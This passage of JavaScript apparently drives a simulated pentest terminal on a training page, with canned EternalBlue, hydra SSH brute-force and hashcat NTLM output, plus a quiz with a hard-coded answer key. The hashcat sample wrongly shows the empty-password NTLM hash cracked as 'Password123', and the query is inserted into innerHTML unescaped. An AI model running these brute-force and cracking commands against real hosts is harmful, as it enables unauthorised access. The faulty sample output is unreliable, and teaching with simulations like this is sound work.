                    outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                        Exploit Title | Path<br>
                        --------------------------------------------------<br>
                        Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution | windows/remote/42315.py<br>
                        MS17-010 EternalBlue SMB Remote Windows Kernel Exploit | windows/remote/42031.py
                    </div>`;
                } else {
                    outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">No local exploits found for query: ${query}</div>`;
                }
                return;
            }

            if (baseCmd === 'hydra') {
                if (cleanCmd.includes('-l') && cleanCmd.includes('-p') && cleanCmd.includes('ssh://')) {
                    outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                        [DATA] attacking ssh://10.0.0.5:22<br>
                        [STATUS] 16 paths/s, 16 tries, 1 target<br>
                        <span style="color: #34d399; font-weight: bold;">[22][ssh] host: 10.0.0.5   login: admin   password: admin123</span><br>
                        [STATUS] 1 of 1 target completed, 1 valid password found
                    </div>`;
                } else {
                    outEl.innerHTML += `<div style="color: #ef4444;">Usage: hydra -l [user] -P [wordlist] ssh://[ip]</div>`;
                }
                return;
            }

            if (baseCmd === 'hashcat') {
                if (cleanCmd.includes('-m 1000') && cleanCmd.includes('rockyou')) {
                    outEl.innerHTML += `<div style="color: #8b949e; margin: 5px 0;">
                        hashcat (v6.1.1) starting...<br>
                        * Device #1: Intel Core Processor (OpenCL)<br>
                        Host memory: 8192 MB | GPU memory: 2048 MB<br>
                        Hashes loaded: 1 (NTLM)<br>
                        Wordlist: rockyou.txt (14344384 words)<br>
                        ---------------------------------------------------<br>
                        31d6cfe0d16ae931b73c59d7e0c089c0:<span style="color: #34d399; font-weight: bold;">Password123</span><br>
                        Status: <span style="color: #34d399;">Cracked</span><br>
                        Time.Started: Mon Jun 30 08:12:45 2026 (0 secs)
                    </div>`;
                } else {
                    outEl.innerHTML += `<div style="color: #ef4444;">Usage: hashcat -m 1000 ntlm.hash rockyou.txt</div>`;
                }
                return;
            }

            outEl.innerHTML += `<div style="color: #ef4444;">Command not found: ${baseCmd}. Type 'help' for options.</div>`;
        }

        // Quiz State Management
        function checkQuizAnswer(questionId, correctLetter) {
            const selected = document.querySelector(`input[name="q${questionId}"]:checked`);
            if (!selected) return;
            
            // Save selection to localStorage
            localStorage.setItem(`sys_quiz_q${questionId}`, selected.value);
            
            // Check overall status
            verifyQuizCompletion();
        }

        function verifyQuizCompletion() {
            const answers = {
                q1: localStorage.getItem('sys_quiz_q1'),
                q2: localStorage.getItem('sys_quiz_q2'),
                q3: localStorage.getItem('sys_quiz_q3')
            };

            const isCorrect = answers.q1 === 'B' && answers.q2 === 'A' && answers.q3 === 'C';
            const msgEl = document.getElementById('quizCompletionMsg');
            if (isCorrect) {
                if (msgEl) msgEl.style.display = 'block';
                localStorage.setItem('sys_quiz_completed', 'true');
            } else {
                if (msgEl) msgEl.style.display = 'none';
                localStorage.setItem('sys_quiz_completed', 'false');
            }
        }

        function loadQuizStatus() {
            const q1 = localStorage.getItem('sys_quiz_q1');
            const q2 = localStorage.getItem('sys_quiz_q2');
            const q3 = localStorage.getItem('sys_quiz_q3');

            if (q1) {
                const el = document.querySelector(`input[name="q1"][value="${q1}"]`);
                if (el) el.checked = true;
            }
            if (q2) {
                const el = document.querySelector(`input[name="q2"][value="${q2}"]`);
                if (el) el.checked = true;
            }
            if (q3) {
                const el = document.querySelector(`input[name="q3"][value="${q3}"]`);
                if (el) el.checked = true;
            }

            verifyQuizCompletion();
        }

        loadCustomCategories();
        reloadAllTools();
        updateCompletionButton();
        loadQuizStatus();